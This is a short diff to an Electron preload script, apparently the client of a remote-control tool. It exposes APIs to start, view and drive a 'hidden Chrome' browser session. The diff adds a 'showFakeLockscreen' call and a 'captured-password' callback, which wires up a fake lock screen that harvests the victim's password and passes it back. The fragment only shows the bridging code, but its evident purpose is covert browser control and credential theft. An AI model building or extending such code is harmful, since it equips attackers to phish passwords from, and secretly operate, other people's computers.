@@ -21,5 +21,7 @@ contextBridge.exposeInMainWorld('electronAPI', {
     startHiddenChrome: (profileName) => ipcRenderer.invoke('start-hidden-chrome', profileName),
     onHiddenChromeFrame: (callback) => ipcRenderer.on('hidden-chrome-frame', (_event, value) => callback(value)),
     sendHiddenChromeAction: (action) => ipcRenderer.invoke('hidden-chrome-action', action),
-    stopHiddenChrome: () => ipcRenderer.invoke('stop-hidden-chrome')
+    stopHiddenChrome: () => ipcRenderer.invoke('stop-hidden-chrome'),
+    showFakeLockscreen: () => ipcRenderer.invoke('show-fake-lockscreen'),
+    onCapturedPassword: (callback) => ipcRenderer.on('captured-password', (_event, value) => callback(value))
 });
